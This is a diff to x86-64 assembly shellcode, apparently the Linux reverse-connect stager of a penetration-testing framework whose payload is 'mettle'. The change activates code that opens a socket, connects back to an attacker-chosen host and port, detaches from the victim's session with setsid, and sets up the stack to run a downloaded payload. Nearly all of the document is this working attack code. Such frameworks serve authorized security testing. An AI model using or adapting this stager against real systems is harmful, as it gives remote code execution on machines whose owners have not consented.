@@ -94,32 +94,34 @@ _exec_parent:
       int 3
 _exec_child:
 
-;      push r9
-;      push   1        ; retry counter
-;      pop    r9
-;      push   0x29
-;      pop    rax
-;      cdq
-;      push   0x2
-;      pop    rdi
-;      push   0x1
-;      pop    rsi
-;      syscall ; socket(PF_INET, SOCK_STREAM, IPPROTO_IP)
-;      pop r9
-;      xchg   rdi, rax
-;
-;    connect:
-;      mov    rcx, 0x#{encoded_host}#{encoded_port}
-;      push   rcx
-;      mov    rsi, rsp
-;      push   0x10
-;      pop    rdx
-;      push   0x2a
-;      pop    rax
-;      syscall ; connect(3, {sa_family=AF_INET, LPORT, LHOST, 16)
-;      mov rax, 0x70
-;      syscall ; setsid
-      xchg rsi, r9
+      push   0x29
+      pop    rax
+      cdq
+      push   0x2
+      pop    rdi
+      push   0x1
+      pop    rsi
+      syscall ; socket(PF_INET, SOCK_STREAM, IPPROTO_IP)
+      xchg   rdi, rax             ; rdi = socket fd
+
+      ; Connect back to the framework
+      mov    rcx, 0x#{encoded_host}#{encoded_port}
+      push   rcx
+      mov    rsi, rsp
+      push   0x10
+      pop    rdx
+      push   0x2a
+      pop    rax
+      syscall ; connect(sockfd, {sa_family=AF_INET, LPORT, LHOST}, 16)
+
+      ; Detach from the target process session
+      push   0x70
+      pop    rax
+      syscall ; setsid
+
+      ; Set up the mettle process stack
+      xchg rsi, r9                ; rsi = mmap'd address (payload), r9 = old rsi
+
       push #{opts[:payload_length]}
       pop rdx
       and rsp, -0x10              ; Align
